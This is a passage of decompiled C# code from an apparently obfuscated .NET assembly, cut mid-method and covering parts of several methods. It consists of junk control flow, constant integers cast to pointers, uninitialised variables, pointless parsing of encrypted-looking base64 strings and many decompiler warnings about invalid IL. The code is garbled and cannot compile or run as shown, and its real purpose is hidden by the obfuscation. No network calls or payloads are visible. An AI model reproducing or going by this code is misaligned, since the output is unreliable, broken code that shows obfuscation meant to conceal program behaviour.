			{
				string s8 = ((long*)(-2118550231L))->ToString("Xf0QseYil4GgId0w2NUBMslCj7kMXPuKYl9bhtWv5K4CBvwn/XxTROQ/A+RRH3vzkByDWKI=");
				sbyte num21 = b;
				bindingFlags = default(BindingFlags);
				array2 = null;
				BindingFlags bindingFlags_4 = bindingFlags;
				long num22 = (long)Class0.smethod_0();
				_003F val3;
				checked
				{
					ulong num23 = 18446744072319332939uL - 18446744072968943370uL;
					object obj32 = char.IsHighSurrogate('辥');
					val3 = num22 * unchecked(num23 / ((obj32 is long) ? obj32 : null)) * -1883129755L;
					text = text;
				}
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
				methodBase_2 = (MethodBase[])(object)((long*)val3)->ToString(text3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] methodBase_4);
				object obj33 = ((ushort*)(ushort)Class2.smethod_0(bindingFlags_4, methodBase_4, null, array3))->CompareTo(25920);
				object obj34 = ((obj33 is short) ? obj33 : null);
				uint num24;
				object obj35;
				checked
				{
					num24 = unchecked((uint)num7) - 8796u;
					obj35 = "mpd57oF1sw2W9rLLvDap25H9+8QtBQo6gjslaT5ut3i67RzNgHJmjsO5XuNI8tfO/QcE0h8=".LastIndexOfAny(anyOf);
				}
				num7 = (short)(int)((obj35 is short) ? obj35 : null);
				short num25 = num7;
				object obj36 = ((uint*)(uint)Settings.Default)->GetHashCode();
				System.Runtime.CompilerServices.Unsafe.SkipInit(out short num26);
				_003F val4 = num26 / checked(num25 * ((obj36 is short) ? obj36 : null));
				ref ulong reference3 = ref *(ulong*)null;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong result2);
				object obj37 = ulong.TryParse("kTMv7IpYiUHL/opN1EjtFYtICdvO5mM4EYvvInx287S7gK/QBYT4gOq4Hd0QjI+FowKMAzI=", out result2);
				_003F val5;
				string s9;
				checked
				{
					val5 = obj34 - (num24 + (-30183 - unchecked(-20934 / (val4 / ((obj37 is short) ? obj37 : null)))));
					s9 = text;
					intPtr = intPtr;
				}
				object obj38 = ((IntPtr*)checked(unchecked((nuint)unchecked((nint)default(IntPtr))) + unchecked((nuint)intPtr)))->ToInt64();
				object obj39 = ((obj38 is char) ? obj38 : null);
				obj3 = obj3;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out object value2);
				object obj40 = ((char*)obj39)->CompareTo(value2);
				object obj41 = byte.TryParse(s9, (NumberStyles)((obj40 is NumberStyles) ? obj40 : null), null, out result);
				ref _003F reference4 = ref *(_003F*)((obj41 is short) ? obj41 : null);
				object obj42 = (flag ? ((bool*)1) : ((bool*)null))->CompareTo((byte)(object)(void*)(IntPtr)(nint)checked(unchecked((nuint)intPtr) * unchecked((nuint)intPtr)) != 0);
				short num27 = (short)System.Runtime.CompilerServices.Unsafe.As<_003F, short>(ref reference4).ToString((IFormatProvider)Class1.smethod_1((BindingFlags)((obj42 is BindingFlags) ? obj42 : null), methodBase_2, null, array3));
				uint num28;
				checked
				{
					num28 = unchecked((uint)(short)Class0.smethod_0()) * 21218u;
				}
				short num29 = (short)Settings.Default;
				object obj43 = char.IsSurrogate(text, -1890748108);
				_003F val6 = num29 / ((obj43 is short) ? obj43 : null);
				ushort num30 = (ushort)text.ToLowerInvariant();
				text = text;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string s10);
				b = (sbyte)checked(unchecked((uint)(sbyte)((ushort*)num30)->ToString(byte.Parse(s10, numberStyles) as string)) + 25u);
				object obj44 = ((short*)val6)->Equals((short)(int)/*isinst with value type is only supported in some contexts*/);
				checked
				{
					_ = num27 + (num28 + ((obj44 is short) ? obj44 : null));
				}
				num7 = (short)Settings.Default;
				num7 = num7;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_8);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out short num31);
				object obj45 = ((sbyte*)num21)->CompareTo((sbyte)Class2.smethod_0(default(BindingFlags), null, type_8, ((short*)(val5 / checked(unchecked((uint)num31) - unchecked((uint)num7) - unchecked((uint)(short)Class1.smethod_2((string)(object)Class5.smethod_0(text))))))->Equals(obj3) as ParameterModifier[]));
				_ = long.Parse(s8, (NumberStyles)((obj45 is NumberStyles) ? obj45 : null), formatProvider) is MethodBase[];
				string s11 = ((ushort*)num18)->ToString().ToUpperInvariant();
				object obj46 = ((short*)30608)->Equals(-14598);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref uint result3);
				_ = uint.TryParse(s11, (NumberStyles)((uint*)((obj46 is uint) ? obj46 : null))->ToString(formatProvider), null, out result3) is MethodBase[];
				uint num32 = (uint)b / 4294967279u;
				b = b;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte obj47);
				methodBase_2 = ((sbyte*)num32)->Equals(obj47) as MethodBase[];
				System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array7);
				methodBase_2 = array7;
				_ = (long)Class2.smethod_0(default(BindingFlags), methodBase_2, ulong.Parse("sXNrauqJr7Betx0d/LfQWlrH/z44fxeMkCHCjbDxUX1uXKXVgoF0k1aSMJTwAzY4isRK938=") as Type[], (ParameterModifier[])(object)Settings.Default);
				numberStyles = default(NumberStyles);
				numberStyles = numberStyles;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style2);
				object obj48 = uint.TryParse("kHKJg5sfAEV5ZfRbp+56B85tpeTW9Rqh/C6mrie+xha6qkHurJMt1jmTvDBkxB57jDRlMgM=", style2, formatProvider, out *(uint*)null);
				num13 = (long)((obj48 is long) ? obj48 : null);
			}
			else
			{
				object obj50;
				object obj51;
				do
				{
					_ = (Struct3)Settings.Default;
					object obj49 = ((bool*)1)->CompareTo(flag);
					obj50 = ((obj49 is ulong) ? obj49 : null);
					obj51 = ((char*)(ushort)c)->GetTypeCode();
				}
				while (((ulong*)checked(967754216L - unchecked(obj50 / ((obj51 is ulong) ? obj51 : null))))->Equals(obj3));
			}
		}
		catch
		{
			if (!(((uint*)1330194444)->CompareTo(obj3) is bool))
			{
				_003F val7;
				object obj53;
				checked
				{
					uint num33 = unchecked((uint)(sbyte)Class1.smethod_2(text)) - 99u;
					sbyte num34 = b;
					object obj52 = unchecked((byte*)226)->GetTypeCode();
					val7 = num33 - num34 * ((obj52 is sbyte) ? obj52 : null);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out ref long result4);
					obj53 = long.TryParse("lUbunNr8+nzo+QZlmEav6DYOMnpwF6nbm65P7xxAR6jtVT2hIlkBR/3v/TQldLgc1lSjMF0=", out result4);
				}
				_ = (Resources)(object)((sbyte*)checked((val7 - ((obj53 is sbyte) ? obj53 : null)) * 42))->ToString(((IntPtr*)(IntPtr)((bool*)null)->ToString())->Equals(((uint*)num2)->GetTypeCode() as object) as string);
				resources = resources;
				resources = resources;
			}
			else
			{
				uint num35;
				uint num36;
				checked
				{
					num35 = 16782u + unchecked((uint)c);
					num36 = 887805201u * 2374985123u;
					text = "71rX/zfQn4z/aJTPSLhWEj300/s8FmWHDAYRzjYSJQOguO0rFFKJF3alCaxaYZxK0rs4aOU=";
				}
				ref _003F reference5 = ref *(_003F*)num35;
				ref _003F reference6 = ref *(_003F*)num36;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string value3);
				object obj54 = bool.Parse(value3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref short result5);
				object obj55 = System.Runtime.CompilerServices.Unsafe.As<_003F, char>(ref reference5).CompareTo(short.TryParse(System.Runtime.CompilerServices.Unsafe.As<_003F, int>(ref reference6).ToString(((short*)((obj54 is short) ? obj54 : null))->GetTypeCode() as IFormatProvider), out result5) as object);
				_003F val8 = checked(((obj55 is byte) ? obj55 : null) * 139);
				obj21 = (byte)((ulong*)(ulong)Settings.Default)->ToString(text);
				obj21 = (byte)(int)val8;
			}
		}
		if (!(default(IntPtr) != default(IntPtr)))
		{
			try
			{
				flag = flag;
				_ = (short)((long*)204848054L)->ToString(formatProvider);
				num7 = num7;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out short num37);
				_ = (_003CPrivateImplementationDetails_003E)(object)((short*)num37)->ToString();
				_ = (ushort)((ushort*)66368)->ToString();
			}
			finally
			{
				if (!((byte)Class0.smethod_0() != 0))
				{
					num2 = (uint)Class5.smethod_2();
					System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num38);
					num2 = num38;
				}
				goto IL_06ff;
			}
		}
		goto IL_06ff;
		IL_06ff:
		try
		{
		}
		catch
		{
			try
			{
				try
				{
					string s12 = text;
					numberStyles = default(NumberStyles);
					object obj57 = ushort.Parse(s12, numberStyles);
					_ = (Class2)(object)Class1.smethod_1((BindingFlags)((obj57 is BindingFlags) ? obj57 : null), methodBase_2, array2, array3);
				}
				catch
				{
					text = ((long*)(-1902499670L))->CompareTo(obj3) as string;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out string s13);
					_ = sbyte.TryParse(s13, out *(sbyte*)null) is Class1;
				}
			}
			catch
			{
				try
				{
					_ = char.IsNumber("QvtcpWLhAjDIsXG6dtFlyBvbImAnLWGSpN8Ki9P9IvLMWijCTq1BFRQXPCTMy84bRUUXfe8=", num) is Struct3;
					goto end_IL_0759;
				}
				finally
				{
					long num39 = num13;
					text = text;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
					text = text4;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
					_ = (short)((long*)num39)->ToString(text5, formatProvider);
					goto end_IL_0759;
				}
				end_IL_0759:;
			}
		}
		try
		{
			if (!flag)
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num40);
				do
				{
					_ = ((byte*)checked(unchecked((uint)obj21) - 77u))->GetHashCode() is ulong;
					num2 = 1255529327u;
					object obj61 = short.Parse(text, numberStyles);
					num2 = (uint)(int)(num40 / checked(2104629452 + ((obj61 is uint) ? obj61 : null)));
					_ = uint.Parse(text) is _003CPrivateImplementationDetails_003E;
					_ = (byte)Settings.Default;
				}
				while ((byte)Class5.smethod_0(text) != 0);
			}
			else if (!flag)
			{
				Settings settings = settings;
				settings = settings;
			}
		}
		finally
		{
			Class3 @class = @class;
			@class = @class;
			goto IL_0948;
		}
	}

	unsafe static void smethod_3()
	{
		//IL_000f: Expected O, but got I4
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected I4, but got Unknown
		//IL_0031: Expected O, but got I4
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected I4, but got Unknown
		//IL_003e: Expected O, but got I4
		//IL_0075: Expected O, but got I4
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got I4
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Expected I4, but got Unknown
		//IL_00b5: Expected O, but got I4
		//IL_0121: Expected O, but got I8
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got I4
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got I8
		//IL_01ad: Expected O, but got I8
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Expected O, but got I8
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected Ref, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Expected I4, but got Unknown
		//IL_01eb: Expected O, but got I
		//IL_020d: Expected O, but got I4
		//IL_024b: Expected O, but got I4
		//IL_0257: Expected O, but got I4
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_0267: Expected I4, but got Unknown
		//IL_0268: Expected O, but got I4
		//IL_028f: Expected O, but got I4
		//IL_02de: Expected O, but got I4
		//IL_02fe: Expected O, but got I4
		//IL_0319: Expected O, but got I4
		//IL_0346: Expected O, but got I4
		//IL_0352: Expected O, but got I4
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_035e: Expected Ref, but got Unknown
		//IL_035f: Expected O, but got I4
		//IL_0375: Expected O, but got I4
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Expected I4, but got Unknown
		//IL_0382: Expected O, but got I4
		//IL_038b: Expected I4, but got O
		//IL_038c: Expected O, but got I8
		//IL_03c4: Expected O, but got I4
		//IL_03df: Expected O, but got I4
		//IL_03f9: Expected O, but got I4
		//IL_0411: Expected O, but got I4
		//IL_042f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0437: Expected Ref, but got Unknown
		//IL_0438: Expected O, but got I4
		//IL_0475: Expected O, but got I4
		//IL_047f: Expected O, but got I8
		//IL_0486: Expected I4, but got O
		//IL_0488: Expected I4, but got O
		//IL_0498: Expected O, but got I4
		//IL_04a2: Expected O, but got I4
		//IL_04ac: Expected O, but got I4
		//IL_0505: Expected O, but got I4
		//IL_052a: Expected O, but got I4
		//IL_0539: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool value);
		uint num3;
		bool num4;
		object obj4;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		int num5;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		do
		{
			try
			{
				c = c;
				char num = c;
				object obj = ((short*)5188)->GetHashCode();
				c = (char)checked(num + ((obj is char) ? obj : null) * c);
			}
			catch
			{
				bool num2 = (byte)Settings.Default != 0;
				object obj2 = sbyte.Parse("tB7NMpRthjIlhxXzdim57jautVFN7UYYYesZjGfkMK82rInd3en1hZvLlk7ruWJOjOK/Rew=", numberStyles);
				flag = (byte)checked(num2 * ((obj2 is bool) ? obj2 : null)) != 0;
				_ = ((bool*)null)->CompareTo(value) is _003CModule_003E;
			}
			num3 = checked((flag ? 1u : 0u) + 1u);
			num4 = flag;
			num5 = 783208617;
			obj4 = ((int*)checked(1506548387u * 783208617u))->CompareTo((int)((ushort*)(ushort)Class0.smethod_0())->ToString());
		}
		while ((int)(checked(num3 - num4 * ((obj4 is bool) ? obj4 : null)) / flag) != 0);
		while (((int*)num5)->CompareTo(num5) is bool)
		{
			try
			{
				num5 = -445776684;
			}
			catch
			{
				object obj5 = (flag ? ((bool*)1) : ((bool*)null))->GetTypeCode();
				c = (char)checked(31394 - ((obj5 is char) ? obj5 : null) + unchecked((char)Class5.smethod_3()));
			}
		}
		short num6 = 8307;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num7);
		long num8 = num7;
		sbyte b = -12;
		uint num9;
		_003F val2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		checked
		{
			num9 = 4294967284u * (4294967284u + 4294967284u);
			bindingFlags = bindingFlags;
			num5 = 1413089666;
			uint num10 = unchecked((uint)(int)Class1.smethod_2(text)) - 1413089666u;
			object obj7 = ulong.Parse("gv2jVCf2mmND6oK/bu21WWVV+9GKh9tx6l24Wvj/2Pa0oHCzHDGJEdEBc10by0CYNpnaSAE=", null);
			_003F val = unchecked(num10 / ((obj7 is int) ? obj7 : null));
			NumberStyles style = numberStyles;
			formatProvider = formatProvider;
			formatProvider = null;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
			formatProvider = formatProvider2;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider);
			object obj8 = sbyte.Parse("ni36h+BZDXLs12Brtxuq5Za4Irri5vpSJeObBGbSyHYthZ9xAiPIQ8HiTYhDxCbKNZgOMNc=", style, provider);
			val2 = val + ((obj8 is int) ? obj8 : null);
		}
		uint num11 = (uint)(int)Class5.smethod_2() / checked(1413089666u * 2422957609u);
		num5 = (int)checked(unchecked((uint)((short*)8307)->CompareTo(Settings.Default)) + 1413089666u);
		_003F val3;
		object obj10;
		_003F val4;
		object obj11;
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out int num12);
			val3 = val2 + unchecked(num11 / (uint)num12) * 3028996808u;
			object obj9 = long.Parse(text, null);
			obj10 = ((obj9 is byte) ? obj9 : null);
			text = text;
			val4 = 141 * /*isinst with value type is only supported in some contexts*/;
			obj11 = ulong.Parse(text);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num13);
		MethodBase[] methodBase_ = ((nint)IntPtr.Subtract(default(IntPtr), checked(num13 * ((val3 * unchecked((int)((byte*)checked(107 + obj10 * unchecked(val4 / ((obj11 is byte) ? obj11 : null))))->ToString(formatProvider)) + num5) * -2117547107) + unchecked((int)Class1.smethod_2(text))))) as MethodBase[];
		bindingFlags = default(BindingFlags);
		formatProvider = (IFormatProvider)Class2.smethod_0(default(BindingFlags), methodBase_, null, (ParameterModifier[])(object)Class2.smethod_0(bindingFlags, null, null, char.GetUnicodeCategory(text, -299684969) as ParameterModifier[]));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider3);
		formatProvider = formatProvider3;
		ulong num14 = (ulong)num8 / (ulong)(long)((sbyte*)num9)->ToString("NvzmO1kRkTJT/+z8n/ZzOrN1ExgdpPLO9rEoFKE5KLyjIeXUDWN4fxRpc0OVVFeJtUXFJBo=", formatProvider);
		num7 = -1731926934L;
		ref _003F reference = ref *(_003F*)15434;
		object obj12 = ((byte*)/*isinst with value type is only supported in some contexts*/)->Equals(29);
		_ = System.Runtime.CompilerServices.Unsafe.As<_003F, short>(ref reference).Equals((short)(checked(8307 * ((obj12 is short) ? obj12 : null)) / -29106)) is int;
		num5 = (int)((byte*)106)->ToString("O3DRuBCY8ORIS5itZwQ2ApN4Wu08Na6K/SqUkAV1oLaGVd/2KSNA0jr1/kAnv326tKyS1Qk=");
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj14);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num18);
		try
		{
			try
			{
				_ = ((int*)(-415627632))->GetHashCode() is GClass0;
				array = null;
				_ = (Class1)(object)Class1.smethod_0(null, array);
			}
			finally
			{
				try
				{
					num6 = num6;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out short num15);
					num6 = num15;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out short num16);
					_ = (sbyte)((short*)num16)->ToString();
				}
				finally
				{
					_ = (Class0)(object)Class5.smethod_2();
					goto end_IL_0283;
				}
			}
			end_IL_0283:;
		}
		catch
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort obj13);
			_ = ((ushort*)19426)->Equals(obj13) is uint;
			int num17;
			checked
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b2);
				num17 = b2 + unchecked((byte)Class0.smethod_0());
				obj14 = null;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj15);
				obj14 = obj15;
			}
			System.Runtime.CompilerServices.Unsafe.SkipInit(out object value3);
			_ = ((byte*)num17)->CompareTo(value3) is uint;
			num18 = num18;
			num18 = num18;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num20);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Class3 class2);
		do
		{
			string s = ((uint*)506167362)->GetTypeCode() as string;
			ushort obj13 = 21810;
			uint num19 = checked(92u * 4294967266u);
			formatProvider = formatProvider;
			object obj17 = ((int*)(int)((ushort*)num20)->ToString(((sbyte*)num19)->ToString(formatProvider4), ((byte*)checked(b3 * unchecked(/*isinst with value type is only supported in some contexts*/ / 0)))->GetTypeCode() as IFormatProvider))->Equals(checked(/*isinst with value type is only supported in some contexts*/ * num5));
			_ = ulong.Parse(s, (NumberStyles)((obj17 is NumberStyles) ? obj17 : null)) is Class1;
			_ = (Class3)(object)Class5.smethod_1(text);
			_ = (Class3)(object)Class1.smethod_0(array, (byte[])(object)Settings.Default);
			Class3 @class = ((ulong*)3L)->CompareTo(num18) as Class3;
			@class = class2;
			@class = @class;
			_ = ((bool*)(0u / 0u))->CompareTo(obj14) is Struct4;
		}
		while (flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref bool reference2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string value4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int count);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj26);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
		do
		{
			try
			{
				_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
				flag = false;
				text = (flag2 ? ((bool*)1) : ((bool*)null))->GetTypeCode() as string;
				text = text3;
				reference2 = ref reference2;
				object obj18 = bool.TryParse(value4, out reference2);
				object obj19 = ((obj18 is IntPtr) ? obj18 : null);
				IntPtr intPtr = default(IntPtr);
				intPtr = intPtr2;
				_003CPrivateImplementationDetails_003E = ((IntPtr*)(obj19 / (nuint)unchecked((nint)default(IntPtr))))->Equals(obj14) as _003CPrivateImplementationDetails_003E;
				_003CPrivateImplementationDetails_003E = null;
				_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E2;
				_003CPrivateImplementationDetails_003E = null;
			}
			catch
			{
				flag = (byte)Class0.smethod_0() != 0;
				uint num21 = checked(1u - (flag ? 1u : 0u));
				string text4 = text;
				num5 = -2110573249;
				object obj20 = ulong.Parse(((int*)text4.LastIndexOf("TZxQQKj+jBTi+1l9hPdOipuy+cDbiStG2v29Xh8NLKWRZfscMpdXEUYOrRkK5eGT/ZzHEkc=", 0, count))->GetHashCode() as string);
				object obj21 = ((obj20 is bool) ? obj20 : null);
				flag = (byte)(int)obj21 != 0;
				flag = (byte)(obj21 / obj21) != 0;
				flag = false;
				object obj22 = ((bool*)checked(num21 - (flag3 ? 1u : 0u) * (1u - (flag4 ? 1u : 0u))))->GetTypeCode();
				object obj23 = ((ushort*)((obj22 is ushort) ? obj22 : null))->GetHashCode();
				object obj24 = ((IntPtr*)((obj23 is IntPtr) ? obj23 : null))->GetHashCode();
				object obj25 = ((obj24 is sbyte) ? obj24 : null);
				obj14 = obj14;
				flag = ((sbyte*)obj25)->Equals(obj26);
			}
			b = b;
			text = (string)(object)Class2.smethod_2(bindingFlags, (PropertyInfo[])(object)Settings.Default, type_, (Type[])(object)((short*)(-18682))->ToString((IFormatProvider?)null), (ParameterModifier[])(object)Class5.smethod_1("ONSGv2lnGYru5rewh9zQgtX1S6Xysl6CcxQiQrDePw7EwJPDrjKoU3vLIJo43nsU2V68+f4="));
		}
		while ((byte)((sbyte*)b4)->ToString(char.Parse(s2) as IFormatProvider) != 0);
		_ = char.IsUpper(text, 1342648875) is NumberStyles;
		numberStyles = numberStyles;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style2);
		_ = int.Parse("6bZ4nBrB1csABQJK71wRJKHa+5h71deDF3qpasGH32Tsk9V36U9jmd6KFnXqFKQADxeh+Wg=", style2) is string;
		Resources resources = resources;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Resources resources2);
		resources = resources2;
		resources = resources;
		_ = (byte)((ushort*)57787)->ToString();
	}

	unsafe static void smethod_4()
	{
		//IL_0020: Expected O, but got I4
		//IL_0046: Expected O, but got I4
		//IL_0076: Expected O, but got I4
		//IL_0090: Expected O, but got I4
		//IL_00f3: Expected O, but got I4
		//IL_00fe: Expected O, but got I4
		//IL_011c: Expected O, but got I4
		//IL_0126: Expected O, but got I4
		//IL_0130: Expected O, but got I4
		//IL_015f: Expected O, but got I4
		//IL_0192: Expected O, but got I4
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Expected O, but got I4
		//IL_01f5: Expected O, but got I4
		//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected I8, but got Unknown
		//IL_0206: Expected O, but got I4
		//IL_0210: Expected O, but got I4
		//IL_0220: Expected O, but got I4
		//IL_0226: Expected I4, but got O
		//IL_024e: Expected O, but got I8
		//IL_0254: Expected I4, but got O
		//IL_0273: Expected O, but got I4
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_029a: Expected O, but got I4
		//IL_02a3: Expected I4, but got O
		//IL_02a4: Expected O, but got I4
		//IL_02fe: Expected O, but got I4
		//IL_030e: Expected O, but got I4
		//IL_0312: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected I4, but got Unknown
		//IL_0318: Expected I4, but got O
		//IL_0350: Expected O, but got I4
		//IL_0360: Expected O, but got I4
		//IL_0369: Expected I4, but got O
		//IL_036a: Expected O, but got I4
		//IL_0370: Expected I4, but got O
		//IL_0385: Expected O, but got I4
		//IL_03a5: Expected O, but got I4
		//IL_03ae: Expected I4, but got O
		//IL_03af: Expected O, but got I4
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d7: Expected O, but got I4
		//IL_03e2: Expected O, but got I4
		//IL_041d: Expected O, but got I4
		//IL_0426: Expected I, but got O
		//IL_0427: Expected O, but got I4
		//IL_0455: Expected O, but got I8
		//IL_0475: Expected O, but got I4
		//IL_048d: Expected O, but got I4
		//IL_04a2: Expected O, but got I4
		//IL_04a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ae: Expected I, but got Unknown
		//IL_04af: Expected O, but got I8
		//IL_04be: Expected I4, but got O
		//IL_04d5: Expected O, but got I4
		//IL_050b: Expected O, but got I4
		//IL_0515: Expected O, but got I4
		//IL_055b: Expected O, but got I4
		//IL_0566: Expected I4, but got O
		//IL_0567: Expected O, but got I4
		//IL_0571: Expected O, but got I4
		//IL_057e: Expected I4, but got O
		//IL_0588: Expected I4, but got Unknown
		//IL_0589: Expected O, but got I4
		//IL_0593: Expected O, but got I4
		//IL_059d: Expected O, but got I4
		//IL_05f3: Expected O, but got I4
		//IL_05fd: Expected O, but got I4
		//IL_060b: Expected O, but got I4
		//IL_062e: Expected O, but got I4
		//IL_063c: Expected O, but got I4
		//IL_0645: Expected I4, but got O
		//IL_0646: Expected O, but got I8
		//IL_0655: Expected O, but got I4
		//IL_0660: Expected O, but got I4
		//IL_066b: Expected I4, but got O
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		try
		{
			if (!((byte)((short*)(-12528))->ToString() != 0))
			{
				char[] array = array;
				if (!("J/zHUUQOWmDjCN5/33eoYpPrEG1G2ISict75PSd9V73nQuiRibbtT4uujVt4dRs0C35FKSc=".IndexOfAny(array) is bool))
				{
					Class2 @class = @class;
					@class = @class;
				}
			}
			else
			{
				void @void = @void;
				@void = @void;
				string s = text;
				numberStyles = numberStyles;
				numberStyles = default(NumberStyles);
				_ = byte.Parse(s, numberStyles, null) is Class2;
			}
		}
		catch
		{
			uint num = num;
			uint num2 = num;
			bindingFlags = default(BindingFlags);
			BindingFlags bindingFlags_ = bindingFlags;
			array2 = array2;
			MethodBase[] methodBase_ = array2;
			short num3 = 28161;
			array3 = ((short*)28161)->GetHashCode() as Type[];
			if (!(((uint*)checked(num2 * unchecked((uint)Class1.smethod_1(bindingFlags_, methodBase_, array3, null))))->GetTypeCode() is bool))
			{
				do
				{
					_ = (string)(object)Settings.Default;
				}
				while (flag);
			}
		}
		_003CModule_003E _003CModule_003E = _003CModule_003E;
		_003CModule_003E = _003CModule_003E;
		_ = (Class3)(object)string.Copy(text);
		Struct3 @struct = @struct;
		@struct = @struct;
		string s2 = ((byte*)1)->ToString("PT3pmriifNsB3Nn0CZoRznqce8SwOuYmd0NoDaGZqrLmdtedy88hAFWSvoqmmmHAm6E8lU4=");
		NumberStyles style = numberStyles;
		BindingFlags bindingFlags_2 = bindingFlags;
		_ = (string)(object)Settings.Default;
